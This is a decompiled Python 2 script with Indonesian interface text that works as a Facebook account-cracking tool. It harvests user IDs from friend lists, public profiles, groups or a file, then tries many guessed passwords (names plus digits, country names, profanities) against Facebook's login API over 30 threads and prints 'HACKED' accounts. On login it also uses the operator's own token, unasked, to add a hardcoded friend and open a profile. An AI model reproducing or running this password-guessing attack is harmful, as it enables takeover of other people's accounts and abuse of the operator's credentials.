# Decompile by Mardis (Tools By Kapten-Kaizo)
# Time Succes decompile : 2022-02-28 18:23:40.885521
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
    print '\x1b[00m[!] \x1b[1;91mExit'
    os.sys.exit()


def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.05)


logo = "\x1b[92m\n\n     ____                _\n    / ___|_ __ __ _  ___| | __\n   | |   | '__/ _` |/ __| |/ /\n   | |___| | | (_| | (__|   <\n    \\____|_|  \\__,_|\\___|_|\\_\\ \n    \n\x1b[00m------------------------------------------\n \x1b[92m   Author \x1b[00m: Aleeju\n \x1b[92m   Github \x1b[00m: Github.com/Azura-X\n \x1b[92m WhatsApp\x1b[00m : +6281332961491\n\x1b[00m------------------------------------------"

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\x1b[1;91m\r[\xe2\x97\x8f] \x1b[92mSedang masuk ' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'

def login():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\x1b[91m[\xe2\x98\x86] \x1b[92mLOGIN AKUN FACEBOOK ANDA \x1b[91m[\xe2\x98\x86]'
        id = raw_input('\x1b[00m[+] \x1b[92mID/Email \x1b[00m: \x1b[1;00m')
        pwd = raw_input('\x1b[00m[+] \x1b[92mPassword \x1b[00m: \x1b[00m')
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[00m[!] \x1b[1;91mTidak ada koneksi'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                unikers = open('login.txt', 'w')
                unikers.write(z['access_token'])
                unikers.close()
                print '\n\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mLogin Berhasil'
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                os.system('xdg-open https://www.facebook.com/amena.ganz.779')
                menu()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[1;96m[!] \x1b[1;91mTidak ada koneksi'
                keluar()

        if 'checkpoint' in url:
            print '\n\x1b[1;96m[!] \x1b[1;91mSepertinya akun anda kena checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            keluar()
        else:
            print '\n\x1b[1;96m[!] \x1b[1;91mPassword/Email salah'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()


def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;96m[!] \x1b[1;91mTidak ada koneksi'
        keluar()

    os.system('clear')
    print logo
    print '\x1b[92mSelamat datang\x1b[00m ' + nama + '\x1b[00m'
    print 42 * '\x1b[00m-'
    print '\x1b[1;97m1.\x1b[1;93m Crack account Indo/Pakistan/Bangladesh '
    print '\x1b[1;97m2.\x1b[1;93m Crack account Random      '
    print '\n\x1b[1;91m0.\x1b[1;91m Logout            '
    pilih()


def pilih():
    unikers = raw_input('\n\x1b[00m >>\x1b[92m')
    if unikers == '':
        print '\x1b[00m[!] \x1b[1;91mIsi yang benar'
        pilih()
    elif unikers == '1':
        super()
    elif unikers == '2':
        super()
    elif unikers == '0':
        os.system('clear')
        jalan('Menghapus token')
        os.system('rm -rf login.txt')
        keluar()
    else:
        print '\x1b[00m[!] \x1b[1;91mIsi yang benar'
        pilih()


def super():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[00m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo
    print '\x1b[92m1.\x1b[00m Crack dari daftar teman'
    print '\x1b[92m2.\x1b[00m Crack dari public'
    print '\n\x1b[1;91m0.\x1b[1;91m Kembali'
    pilih_super()


def pilih_super():
    global cekpoint
    global oks
    peak = raw_input('\n\x1b[1;97m >>> \x1b[1;97m')
    if peak == '':
        print '\x1b[00m[!] \x1b[1;91mIsi yang benar'
        pilih_super()
    else:
        if peak == '1':
            os.system('clear')
            print logo
            jalan('\x1b[00m[\xe2\x9c\xba] \x1b[92mMengambil ID \x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        elif peak == '2':
            os.system('clear')
            print logo
            idt = raw_input('\x1b[00m[+] \x1b[92mMasukan ID public \x1b[1;91m: \x1b[1;97m')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[00m[\x1b[92m\xe2\x9c\x93\x1b[00m] \x1b[92mNama public\x1b[1;91m :\x1b[1;97m ' + op['name']
            except KeyError:
                print '\x1b[00m[!] \x1b[91mTeman tidak ditemukan!'
                raw_input('\n\x1b[00m[\x1b[92mKembali\x1b[00m]')
                super()

            jalan('\x1b[00m[\xe2\x9c\xba] \x1b[92mMengambil ID \x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif peak == '3':
            os.system('clear')
            print logo
            idg = raw_input('\x1b[00m[+] \x1b[92mMasukan ID group \x1b[1;91m:\x1b[1;97m ')
            try:
                r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
                asw = json.loads(r.text)
                print '\x1b[00m[\x1b[92m\xe2\x9c\x93\x1b[00m] \x1b[92mNama group \x1b[1;91m:\x1b[1;97m ' + asw['name']
            except KeyError:
                print '\x1b[00m[!] \x1b[1;91mGroup tidak ditemukan'
                raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
                super()

            jalan('\x1b[00m[\xe2\x9c\xba] \x1b[92mMengambil ID \x1b[1;97m...')
            re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
            s = json.loads(re.text)
            for p in s['data']:
                id.append(p['id'])

        elif peak == '4':
            os.system('clear')
            print logo
            try:
                idlist = raw_input('\x1b[00m[+] \x1b[92mMasukan nama file  \x1b[00m: \x1b[00m')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except IOError:
                print '\x1b[00m[!] \x1b[1;91mFile tidak ditemukan'
                raw_input('\n\x1b[00m[ \x1b[91mKembali \x1b[00m]')
                super()

        elif peak == '0':
            menu()
        else:
            print '\x1b[00m[!] \x1b[1;91mIsi yang benar'
            pilih_super()
        print '\x1b[92m[+] \x1b[00mTotal ID \x1b[00m: \x1b[92m' + str(len(id))
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[92m[\x1b[1;97m\xe2\x9c\xb8\x1b[92m] \x1b[00mCrack \x1b[1;97m' + o,
            sys.stdout.flush()
            time.sleep(1)

    print
    print '\x1b[1;92m[!] \x1b[00mLebih cepat gunakan VPN Brazil/US'
    print 42 * '\x1b[00m-'

    def main(arg):
        user = arg
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[92mHACKED]' + user + '<=>' + pass1
                oks.append(user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass1
                cekpoint.append(user + pass1)
            else:
                pass2 = b['first_name'] + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[92m[HACKED]' + user + '<=>' + pass2
                    oks.append(user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass2
                    cekpoint.append(user + pass2)
                else:
                    pass3 = b['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[92m[HACKED]' + user + '<=>' + pass3
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass3
                        cekpoint.append(user + pass3)
                    else:
                        pass4 = b['first_name'] + '123456'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        if 'access_token' in q:
                            print '\x1b[92m[HACKED]' + user + '<=>' + pass4
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass4
                            cekpoint.append(user + pass4)
                        else:
                            pass5 = b['last_name'] + '123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[92m[HACKED]' + user + '<=>' + pass5
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass5
                                cekpoint.append(user + pass5)
                            else:
                                pass6 = b['last_name'] + '1234'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[92m[HACKED]' + user + '<=>' + pass6
                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass6
                                    cekpoint.append(user + pass6)
                                else:
                                    pass7 = b['last_name'] + '12345'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[92m[HACKED]' + user + '<=>' + pass7
                                        oks.append(user + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass7
                                        cekpoint.append(user + pass7)
                                    else:
                                        pass8 = b['last_name'] + '123456'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            print '\x1b[92m[HACKED]' + user + '<=>' + pass8
                                            oks.append(user + pass8)
                                        elif 'www.facebook.com' in q['error_msg']:
                                            print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass8
                                            cekpoint.append(user + pass8)
                                        else:
                                            pass9 = 'Kontol'
                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[92m[HACKED]' + user + '<=>' + pass9
                                                oks.append(user + pass9)
                                            elif 'www.facebook.com' in q['error_msg']:
                                                print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass9
                                                cekpoint.append(user + pass9)
                                            else:
                                                pass10 = 'Kontol123'
                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                q = json.load(data)
                                                if 'access_token' in q:
                                                    print '\x1b[92m[HACKED]' + user + '<=>' + pass10
                                                    oks.append(user + pass10)
                                                elif 'www.facebook.com' in q['error_msg']:
                                                    print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass10
                                                    cekpoint.append(user + pass10)
                                                else:
                                                    pass12 = '786786'
                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass12 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                    q = json.load(data)
                                                    if 'access_token' in q:
                                                        print '\x1b[92m[HACKED]' + user + '<=>' + pass12
                                                        oks.append(user + pass12)
                                                    elif 'www.facebook.com' in q['error_msg']:
                                                        print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass12
                                                        cekpoint.append(user + pass12)
                                                    else:
                                                        pass13 = b['first_name'] + '786'
                                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass13 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                        q = json.load(data)
                                                        if 'access_token' in q:
                                                            print '\x1b[92m[HACKED]' + user + '<=>' + pass13
                                                            oks.append(user + pass13)
                                                        elif 'www.facebook.com' in q['error_msg']:
                                                            print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass13
                                                            cekpoint.append(user + pass13)
                                                        else:
                                                            pass14 = b['last_name'] + '786'
                                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass14 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                            q = json.load(data)
                                                            if 'access_token' in q:
                                                                print '\x1b[92m[HACKED]' + user + '<=>' + pass14
                                                                oks.append(user + pass14)
                                                            elif 'www.facebook.com' in q['error_msg']:
                                                                print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass14
                                                                cekpoint.append(user + pass14)
                                                            else:
                                                                pass15 = 'Bangladesh'
                                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass15 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                q = json.load(data)
                                                                if 'access_token' in q:
                                                                    print '\x1b[92m[HACKED]' + user + '<=>' + pass15
                                                                    oks.append(user + pass15)
                                                                elif 'www.facebook.com' in q['error_msg']:
                                                                    print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass15
                                                                    cekpoint.append(user + pass15)
                                                                else:
                                                                    pass16 = 'Bangladesh123'
                                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass16 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                    q = json.load(data)
                                                                    if 'access_token' in q:
                                                                        print '\x1b[92m[HACKED]' + user + '<=>' + pass16
                                                                        oks.append(user + pass16)
                                                                    elif 'www.facebook.com' in q['error_msg']:
                                                                        print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass16
                                                                        cekpoint.append(user + pass16)
                                                                    else:
                                                                        pass17 = 'Pakistan'
                                                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass17 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                        q = json.load(data)
                                                                        if 'access_token' in q:
                                                                            print '\x1b[92m[HACKED]' + user + '<=>' + pass17
                                                                            oks.append(user + pass17)
                                                                        elif 'www.facebook.com' in q['error_msg']:
                                                                            print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass17
                                                                            cekpoint.append(user + pass17)
                                                                        else:
                                                                            pass18 = 'Pakistan123'
                                                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass18 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                            q = json.load(data)
                                                                            if 'access_token' in q:
                                                                                print '\x1b[92m[HACKED]' + user + '<=>' + pass18
                                                                                oks.append(user + pass18)
                                                                            elif 'www.facebook.com' in q['error_msg']:
                                                                                print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass18
                                                                                cekpoint.append(user + pass18)
                                                                            else:
                                                                                pass19 = 'Bangsat'
                                                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass19 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                q = json.load(data)
                                                                                if 'access_token' in q:
                                                                                    print '\x1b[92m[HACKED]' + user + '<=>' + pass19
                                                                                    oks.append(user + pass19)
                                                                                elif 'www.facebook.com' in q['error_msg']:
                                                                                    print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass19
                                                                                    cekpoint.append(user + pass19)
                                                                                else:
                                                                                    pass20 = 'Bangsat123'
                                                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass20 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                    q = json.load(data)
                                                                                    if 'access_token' in q:
                                                                                        print '\x1b[92m[HACKED]' + user + '<=>' + pass20
                                                                                        oks.append(user + pass20)
                                                                                    elif 'www.facebook.com' in q['error_msg']:
                                                                                        print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass20
                                                                                        cekpoint.append(user + pass20)
                                                                                    else:
                                                                                        pass21 = 'Anjing'
                                                                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass21 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                        q = json.load(data)
                                                                                        if 'access_token' in q:
                                                                                            print '\x1b[92m[HACKED]' + user + '<=>' + pass21
                                                                                            oks.append(user + pass21)
                                                                                        elif 'www.facebook.com' in q['error_msg']:
                                                                                            print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass21
                                                                                            cekpoint.append(user + pass21)
                                                                                        else:
                                                                                            pass22 = 'Anjing123'
                                                                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass22 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                            q = json.load(data)
                                                                                            if 'access_token' in q:
                                                                                                print '\x1b[92m[HACKED]' + user + '<=>' + pass22
                                                                                                oks.append(user + pass22)
                                                                                            elif 'www.facebook.com' in q['error_msg']:
                                                                                                print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass22
                                                                                                cekpoint.append(user + pass22)
                                                                                            else:
                                                                                                pass23 = 'Sayang'
                                                                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass23 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                                q = json.load(data)
                                                                                                if 'access_token' in q:
                                                                                                    print '\x1b[92m[HACKED]' + user + '<=>' + pass23
                                                                                                    oks.append(user + pass23)
                                                                                                elif 'www.facebook.com' in q['error_msg']:
                                                                                                    print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass23
                                                                                                    cekpoint.append(user + pass23)
                                                                                                else:
                                                                                                    pass24 = 'Sayang123'
                                                                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass24 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                                    q = json.load(data)
                                                                                                    if 'access_token' in q:
                                                                                                        print '\x1b[92m[HACKED]' + user + '<=>' + pass24
                                                                                                        oks.append(user + pass24)
                                                                                                    elif 'www.facebook.com' in q['error_msg']:
                                                                                                        print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass24
                                                                                                        cekpoint.append(user + pass24)
                                                                                                    else:
                                                                                                        b = json.load(a.txt)
                                                                                                        pass25 = 'Indonesia'
                                                                                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass25 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                                        q = json.load(data)
                                                                                                        if 'access_token' in q:
                                                                                                            print '\x1b[92m[HACKED]' + user + '<=>' + pass25
                                                                                                            oks.append(user + pass25)
                                                                                                        elif 'www.facebook.com' in q['error_msg']:
                                                                                                            print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass25
                                                                                                            cekpoint.append(user + pass25)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[00m[\x1b[00m\xe2\x9c\x93\x1b[00m] \x1b[1;92mSelesai \x1b[1;97m....'
    print '\x1b[00m[+] \x1b[1;92mTotal OK/\x1b[91mCP \x1b[93m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[91m' + str(len(cekpoint))
    raw_input('\n\x1b[00m[\x1b[92mKembali\x1b[00m]')
    super()


if __name__ == '__main__':
    login()
